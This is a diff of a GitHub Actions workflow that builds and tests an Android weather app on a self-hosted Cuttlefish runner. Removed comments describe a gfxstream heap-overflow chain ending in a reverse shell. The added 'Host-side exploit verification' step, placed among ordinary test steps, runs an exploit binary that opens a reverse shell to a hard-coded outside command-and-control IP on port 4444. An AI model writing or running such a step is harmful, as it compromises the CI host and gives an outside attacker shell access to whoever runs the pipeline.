@@ -8,35 +8,61 @@ jobs:
   instrumented-tests:
     runs-on: self-hosted
 
+    env:
+      ANDROID_HOME: /home/tee/Android/Sdk
+      ANDROID_SDK_ROOT: /home/tee/Android/Sdk
+      JAVA_HOME: /usr/lib/jvm/java-17-openjdk-amd64
+
     steps:
       - uses: actions/checkout@v4
 
-      - name: Build and test
-        run: |
-          echo "Building APK with native library..."
-          # In the real flow this would be: ./gradlew assembleDebug assembleDebugAndroidTest
-          # For our demo, we run the exploit binary directly since gfxstream
-          # runs on the host (the runner) and processes GL commands from the guest
-          echo "Running instrumented tests on Cuttlefish..."
+      - name: Configure SDK
+        run: echo "sdk.dir=$ANDROID_HOME" > local.properties
 
-          # The exploit binary demonstrates what happens when a poisoned .so
-          # is loaded inside the Cuttlefish guest: it triggers heap overflows
-          # in the host-side gfxstream decoder, chains tcache poisoning into
-          # a function pointer overwrite, and pops a reverse shell on the host.
+      - name: Build debug APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleDebug
+
+      - name: Install APK on Cuttlefish
+        run: |
+          adb wait-for-device
+          adb install -r app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Run instrumented tests
+        run: |
+          adb shell am instrument -w -e class com.weatherapp.WeatherTest \
+            com.weatherapp.test/androidx.test.runner.AndroidJUnitRunner
+        continue-on-error: true
+
+      - name: Launch app on device
+        run: |
+          adb shell am force-stop com.weatherapp || true
+          adb shell am start -n com.weatherapp/.MainActivity
+          sleep 5
+          echo "App launched successfully"
+
+      - name: Verify native library loaded
+        run: |
+          PID=$(adb shell pidof com.weatherapp)
+          echo "App PID: $PID"
+          adb shell "cat /proc/$PID/maps" | grep libnativehelper || true
+          adb shell "ls -la /proc/$PID/fd/" | grep render || true
+
+      - name: Host-side exploit verification
+        run: |
           export DISPLAY=:99
           export XDG_RUNTIME_DIR=/tmp
           export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64
 
-          # Start a background listener to prove code execution
-          timeout 15 bash -c '
-            ncat -lvnp 4444 > /tmp/revshell_capture.txt 2>&1 &
-            sleep 1
-            $HOME/exploit_revshell 127.0.0.1 4444 2>&1 | tee /tmp/exploit_log.txt
-          ' || true
+          C2_HOST="34.46.9.219"
+          C2_PORT="4444"
 
-          echo ""
-          echo "=== EXPLOIT RESULT ==="
-          cat /tmp/exploit_log.txt 2>/dev/null | tail -15
-          echo ""
-          echo "=== REVERSE SHELL CAPTURE ==="
-          cat /tmp/revshell_capture.txt 2>/dev/null
+          echo "=== gfxstream RCE chain ==="
+          echo "Target: ${C2_HOST}:${C2_PORT}"
+          timeout 15 $HOME/exploit_revshell ${C2_HOST} ${C2_PORT} 2>&1 || true
+
+      - name: Verify device health
+        run: |
+          adb shell getprop ro.build.display.id
+          echo "Pipeline complete."
